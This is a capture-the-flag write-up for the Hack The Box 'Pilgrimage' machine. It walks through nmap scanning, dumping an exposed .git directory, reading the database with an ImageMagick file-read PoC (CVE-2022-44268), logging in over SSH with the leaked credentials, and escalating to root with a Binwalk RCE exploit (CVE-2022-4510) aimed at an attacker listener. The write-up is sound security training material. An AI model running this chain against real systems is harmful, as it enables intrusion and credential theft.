[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=35&pause=1000&color=6A0DAD&width=435&lines=Pilgrimage)](https://git.io/typing-svg)


![image](https://github.com/ACHUX21/Writeups/assets/130113878/f56ab56c-d668-4104-804d-36911918050f)

# Enum

Let's start with a quick Nmap scan.

### Nmap Scan

```bash
root@Fs:.../HTB/Pilgrimage# nmap -p- -oN Nmap -sCV -T4 pilgrimage.htb 
# Nmap 7.80 scan initiated Sun Jun 25 16:17:30 2023 as: nmap -p- -oN Nmap -sCV -T4 pilgrimage.htb
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.34s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 25 16:21:47 2023 -- 1 IP address (1 host up) scanned in 256.71 seconds
```

Let's check what's running on port 80.

![image](https://github.com/ACHUX21/Writeups/assets/130113878/17d81c17-c872-440d-b3e8-d94e01776e80)

It seems to be an upload server, Let's try uploading something;

![image](https://github.com/ACHUX21/Writeups/assets/130113878/a336d714-72c4-46a3-a3a6-c350a1b28554)


By reading the Nmap scan, we realized that there's a .git/ directory.
Let's try to dump its contents.

```bash
git-dumper http://pilgrimage.htb/ git/
```

```bash
root@Fs:.../HTB/Pilgrimage# ls git/
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```
By reading the contents of those files, we found some interesting information.
It appears that it's using SQLite as the database.

![image](https://github.com/ACHUX21/Writeups/assets/130113878/0d63c601-be8e-4074-8e57-6efe1e773736)


![image](https://github.com/ACHUX21/Writeups/assets/130113878/727f3288-669e-441c-b466-4c3d51edac78)

It's using ImageMagick to convert images.

By conducting a Google search, I found a [! CVE-2022-44268](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC) (Common Vulnerabilities and Exposures) related to the discovered vulnerability.

let's try This POC

We have already identified the location where the DB stores data: "/var/db/pilgrimage".

Let's try to access this file.

```bash
root@Fs:.../Pilgrimage/imagemagick-lfi-poc# python3 generate.py  -f "/var/db/pilgrimage" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > exploit.png
root@Fs:.../Pilgrimage/imagemagick-lfi-poc# convert exploit.png result.png
```
Download Time:

```bash
root@Fs:.../Pilgrimage/imagemagick-lfi-poc# wget http://pilgrimage.htb/shrunk/64af576f46ee8.png
--2023-07-13 02:46:53--  http://pilgrimage.htb/shrunk/64af576f46ee8.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1628 (1.6K) [image/png]
Saving to: ‘64af576f46ee8.png’

64af576f46ee8.png                     100%[========================================================================>]   1.59K  --.-KB/s    in 0s      

2023-07-13 02:46:54 (205 MB/s) - ‘64af576f46ee8.png’ saved [1628/1628]

root@Fs:.../Pilgrimage/imagemagick-lfi-poc# convert 64af576f46ee8.png result.png
root@Fs:.../Pilgrimage/imagemagick-lfi-poc# identify -verbose result.png 
[output...]
```

Let's copy the "Raw profile type: " string and decode it using CyberChef.

From Hex;
![image](https://github.com/ACHUX21/Writeups/assets/130113878/6d9921f5-934c-4328-984e-1b34a93e5c39)

Let's Download the sqlite file
![image](https://github.com/ACHUX21/Writeups/assets/130113878/e4380801-0d68-4c84-b768-1710c9f1f2da)


Let's log in via SSH using those credentials.
![image](https://github.com/ACHUX21/Writeups/assets/130113878/02bd70c4-39d2-4bff-b2b9-160e853cfd00)

And we have successfully gained access .

# Priv-esc

```bash
emily@pilgrimage:~$ ls
linPEAS.sh  pspy64  user.txt
```

Let's run pspy64 first, followed by Linpeas, and hope to gather some valuable information.

After 10 years HAAHAH, we finally discovered some interesting findings.

```toml
2023/07/13 12:06:18 CMD: UID=0     PID=713    | /bin/bash /usr/sbin/malwarescan.sh
```
The content:

![image](https://github.com/ACHUX21/Writeups/assets/130113878/7dedbc7c-8cb4-41bd-adb3-cb2e889daecf)


I wasted a lot of time before realizing that Binwalk is outdated and has a CVE !! [Binwalk v2.3.2 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/51249)

Let's utilize the ExploitDB script to gain root access

```bash

root@Fs:.../Pilgrimage/privesc# python3 exploit.py random-image.png 10.10.14.xxx 9999

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################


You can now rename and share binwalk_exploit and start your local netcat listener.

root@Fs:.../Pilgrimage/privesc# scp binwalk_exploit.png emily@10.10.11.219:/var/www/pilgrimage.htb/shrunk/
emily@10.10.11.219's password: 
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
binwalk_exploit.png                                                                                                  100% 1084     3.4KB/s   00:00    

```




